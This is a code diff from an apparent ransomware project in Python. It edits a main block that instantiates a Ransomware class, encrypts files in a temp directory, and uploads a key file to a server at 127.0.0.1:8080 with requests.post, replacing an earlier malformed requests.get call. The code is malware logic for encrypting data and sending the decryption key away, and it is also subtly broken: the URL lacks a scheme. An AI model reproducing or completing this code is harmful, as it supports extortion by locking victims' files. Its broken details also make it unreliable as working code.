@@ -136,8 +136,6 @@ if __name__ == '__main__':
     #rware.generate_key()
     #rware.write_key()
 
-
-
     import argparse
     parser = argparse.ArgumentParser()
     parser.add_argument('--action')# , required=True
@@ -146,7 +144,7 @@ if __name__ == '__main__':
     args = parser.parse_args()
     action = args.action #.lower()
     keyfile = args.keyfile
-
+    
     rware = Ransomware()
     server = Server()
 
@@ -165,9 +163,12 @@ if __name__ == '__main__':
         rware.crypt_tmp(local_tmp)
 
 
+        url = '127.0.0.1:8080'
+        files = {'file': open('keyfile', 'rb')}
 
+        r = requests.post(url, files=files)
 
-        r = requests.get(url='127.0.0.1',params =keyfile, port 8080)
+        #r = requests.get(url='127.0.0.1',params =keyfile, port 8080)
 
 
 
